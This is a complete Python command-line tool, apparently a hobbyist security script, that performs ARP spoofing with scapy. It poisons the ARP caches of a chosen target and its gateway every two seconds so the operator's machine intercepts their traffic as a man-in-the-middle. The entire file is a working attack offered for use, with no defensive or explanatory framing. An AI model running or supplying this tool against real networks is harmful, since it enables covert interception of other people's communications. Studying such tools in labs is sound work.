#!/usr/bin/env python3

import argparse
import re
import time
import os
import socket
import signal
import sys
import scapy.all as scapy
from termcolor import colored

# Controlled quite
def def_handler(sig, frame):
    print(colored("\n[!] Quitting the program...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # CTRL + C

# Menu arguments
def get_arguments():
    argparser = argparse.ArgumentParser(description="ARP Spoofer - MITM")
    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Host / IP Range. (Ex: 192.168.1.2 / 192.168.1.0/21)") # arget argument
    argparser.add_argument("-r", "--router", dest="router", required=True, help="Gateway IP of router. (Ex: 192.168.1.1)") # arget argument
    argparser.add_argument("-m", "--mac", dest="mac_address", required=True, help="Your current mac addreess. (Ex: aa:bb:cc:44:55:66)") # arget argument
    argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)") # interface argument

    args = argparser.parse_args() # get arguments

    return args.target, args.interface, args.router, args.mac_address # return each argument

# Verify correct format of given arguments and root privilege
def verify(target, interface, router_ip, hwsrc):

    # Verify root privilege
    if os.getuid() != 0:
        print(colored("\n[!] Root privilege required.\n", "yellow"))
        sys.exit(1)

    ip_re = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"

    match = True if re.match(ip_re, target) or re.match(r"^([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$", target) else False # Verify target format
    match_router = True if re.match(ip_re, router_ip) else False # Verify gateway format
    match_mac = True if re.match(r"^([a-fA-F0-9]{0,2}\:){5}[a-fA-F0-9]{0,2}$", hwsrc) else False # Verify mac address format

    if match and ('/' in target):
        match = True if int(target.split('/')[1]) < 33 else False # Verify correct bitmask (< 33)

    interfaces = [i[1] for i in socket.if_nameindex()] # Get all Local Network Interfaces Names
    valid_interface = True if interface in interfaces else False # Verify if the given Network Interface Name is in the PC

    return match and valid_interface and match_router and match_mac # Return True if all is correct

def get_dst_mac(ip, interface, retries=40):
    for retry in range(retries):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        arp_packet = broadcast_packet / arp_packet

        answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc

    else:
        return None
    
# Send spoof message to convert you in a MITM
def spoof(target_ip, interface, router_ip, hwsrc, hwdst):
    arp_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=hwsrc, hwdst=hwdst)
    broadcast_packet = scapy.Ether(dst=hwdst)
    
    packet = broadcast_packet / arp_packet

    scapy.sendp(packet, verbose=False,iface=interface)

def main():
    target, interface, router_ip, hwsrc = get_arguments() # get arguments
    isValid = verify(target, interface, router_ip, hwsrc) # Verify format arguments

    if isValid:
        target_mac =  get_dst_mac(target, interface)
        router_mac =  get_dst_mac(router_ip, interface)
    
        if not target_mac or not router_mac:
            print(colored("\n[!] Error when try getting destination mac address.\n", "red"))
            sys.exit(1)

        while True:
            spoof(target, interface, router_ip, hwsrc, target_mac)
            spoof(router_ip, interface, target, hwsrc, router_mac)

            time.sleep(2)
    else:
        print(colored("\n[!] Arguments Incorrect Format.\n", "red"))
        sys.exit(1)

if __name__ == "__main__":
    main()
